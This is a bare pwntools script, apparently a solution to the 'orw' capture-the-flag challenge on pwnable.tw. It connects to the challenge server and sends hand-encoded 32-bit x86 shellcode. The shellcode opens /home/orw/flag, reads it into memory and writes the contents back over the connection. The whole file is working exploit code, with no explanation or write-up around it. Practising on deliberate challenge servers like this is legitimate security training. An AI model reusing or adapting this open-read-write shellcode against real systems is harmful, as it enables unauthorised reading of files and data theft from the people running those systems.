from pwn import *

#p = process("./orw")
p = remote("chall.pwnable.tw", 10001)
#gdb.attach(p, "b *main+58")

print p.recv()
payload = "\x68\x61\x67\x00\x00\x68\x77\x2F\x66\x6C\x68\x65\x2F\x6F\x72\x68\x2F\x68\x6F\x6D\x89\xE3\x31\xC9\xBA\x09\x03\x00\x00\x31\xC0\xB0\x05\xCD\x80\x89\xC3\xB9\x60\xA0\x04\x08\xBA\x3C\x00\x00\x00\x31\xC0\xB0\x03\xCD\x80\xBB\x01\x00\x00\x00\x31\xC0\xB0\x04\xCD\x80"
p.sendline(payload)
p.interactive()
